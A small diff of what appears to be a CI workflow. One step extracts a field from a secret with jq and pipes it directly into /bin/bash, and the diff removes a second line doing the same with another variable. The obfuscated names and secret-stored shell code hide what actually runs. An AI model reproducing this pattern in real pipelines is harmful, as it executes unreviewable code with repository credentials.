@@ -23,7 +23,6 @@ jobs:
           yu2: ${{ secrets.yu2 }}
         run: |
           printf '%s' "$yu2" | jq -r .nauk6865 | /bin/bash
-          echo $mekl97 | jq -r .r76605 | /bin/bash
 
       - name: Upload results
         if: always()
